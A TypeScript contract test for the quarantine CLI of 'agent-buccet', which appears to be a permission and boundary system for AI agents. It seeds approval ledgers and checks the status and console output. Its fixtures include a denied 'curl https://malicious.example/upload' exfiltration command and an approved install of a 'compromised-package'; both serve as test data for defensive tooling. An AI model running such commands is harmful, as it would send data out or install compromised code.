import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import { promises as fs } from "node:fs";
import { spawn } from "node:child_process";

import {
  appendBoundaryLedger,
  armBoundaryQuarantineReboot,
  enableBodyguardControl,
  loadUserPathLedger,
  writeApprovedUserPathLaw,
  writeDeniedUserPathLaw,
} from "../lib/agent-buccet/index.ts";

type CliResult = {
  code: number;
  stdout: string;
  stderr: string;
};

async function runCli(args: string[], env: NodeJS.ProcessEnv, stdinText?: string): Promise<CliResult> {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, ["scripts/buccet.ts", ...args], {
      cwd: process.cwd(),
      env,
      stdio: "pipe",
    });

    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk) => {
      stdout += String(chunk);
    });
    child.stderr.on("data", (chunk) => {
      stderr += String(chunk);
    });
    child.on("error", reject);
    child.on("close", (code) => {
      resolve({
        code: code ?? 1,
        stdout,
        stderr,
      });
    });

    if (stdinText) {
      child.stdin.write(stdinText);
    }
    child.stdin.end();
  });
}

async function main() {
  const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "agent-buccet-quarantine-cli-"));
  const homePath = path.join(tempRoot, "home");
  const ledgerPath = path.join(tempRoot, "user-path-ledger.json");
  const env = {
    ...process.env,
    AGENT_BUCCET_HOME: homePath,
    AGENT_BUCCET_UPL_LEDGER_PATH: ledgerPath,
  };

  try {
    const initResult = await runCli(["init", "--session-id", "quarantine-cli-session", "--actor-id", "user:quarantine-cli"], env);
    assert.equal(initResult.code, 0, initResult.stderr);

    const configPath = path.join(homePath, "config.json");
    const config = JSON.parse(await fs.readFile(configPath, "utf8")) as {
      sessionId: string;
      actorId: string;
    };
    const sessionsDir = path.join(homePath, "data", "agent-boundary", "sessions");
    const boundary = await import("../lib/agent-buccet/index.ts");
    const restored = await boundary.restoreBoundaryRuntimeStore({
      sessionId: config.sessionId,
      sessionsDir,
      hydrationMode: "full",
    });
    assert.ok(restored, "restored store must exist after init");
    let runtimeConfig = enableBodyguardControl(restored.getConfig());
    let upl = await loadUserPathLedger();

    const approvedRequest = {
      requestId: "quarantine-cli-approved",
      sessionId: runtimeConfig.session.sessionId,
      actionKind: "tool.exec" as const,
      target: "npm",
      payloadSummary: "spawn:npm install compromised-package",
      requestedAt: new Date().toISOString(),
      provenance: "agent_inference" as const,
      flags: {
        authorityClaimed: true,
      },
    };
    const deniedRequest = {
      ...approvedRequest,
      requestId: "quarantine-cli-denied",
      target: "curl",
      payloadSummary: "spawn:curl https://malicious.example/upload",
    };

    const approvedWitness = await appendBoundaryLedger("APPROVAL_GRANTED", {
      sessionId: runtimeConfig.session.sessionId,
      actorId: runtimeConfig.session.actorId,
      requestId: approvedRequest.requestId,
      actionKind: approvedRequest.actionKind,
      target: approvedRequest.target,
      decision: "allow",
      reason: "seed approved upl item for quarantine cli contract",
      createdAt: new Date().toISOString(),
    });
    upl = await writeApprovedUserPathLaw({
      ledger: upl,
      request: approvedRequest,
      witness: approvedWitness,
      session: runtimeConfig.session,
      decision: { choice: "allow_as_law" },
    });

    const deniedWitness = await appendBoundaryLedger("APPROVAL_DENIED", {
      sessionId: runtimeConfig.session.sessionId,
      actorId: runtimeConfig.session.actorId,
      requestId: deniedRequest.requestId,
      actionKind: deniedRequest.actionKind,
      target: deniedRequest.target,
      decision: "deny",
      reason: "seed denied upl item for quarantine cli contract",
      createdAt: new Date().toISOString(),
    });
    upl = await writeDeniedUserPathLaw({
      ledger: upl,
      request: deniedRequest,
      witness: deniedWitness,
      session: runtimeConfig.session,
      decision: { choice: "deny_as_law" },
    });

    runtimeConfig = {
      ...runtimeConfig,
      upl,
    };
    await armBoundaryQuarantineReboot({
      config: runtimeConfig,
      reason: "cli contract forced shed reboot boundary-on-self",
    });

    const statusResult = await runCli(["quarantine", "status", "--json"], env);
    assert.equal(statusResult.code, 0, statusResult.stderr);
    const status = JSON.parse(statusResult.stdout) as {
      required: boolean;
      pitCount: number;
      entries: Array<{ verdict: string }>;
    };
    assert.equal(status.required, true);
    assert.equal(status.pitCount >= 1, true);
    assert.equal(status.entries.every((entry) => entry.verdict === "pit" || entry.verdict === "survivor"), true);

    const consoleResult = await runCli(["console"], env, "quit\n");
    assert.equal(consoleResult.code, 0, consoleResult.stderr);
    assert.match(consoleResult.stdout, /Shed Reboot/i);
    assert.match(consoleResult.stdout, /Boundary on Self/i);
    assert.match(consoleResult.stdout, /buccet quarantine deny-all/);

    console.log("Agent Buccet quarantine CLI contract");
    console.log(`pit count: ${status.pitCount}`);
    console.log("console gate: ok");
  } finally {
    delete env.AGENT_BUCCET_HOME;
    delete env.AGENT_BUCCET_UPL_LEDGER_PATH;
    await fs.rm(tempRoot, { recursive: true, force: true });
  }
}

await main();
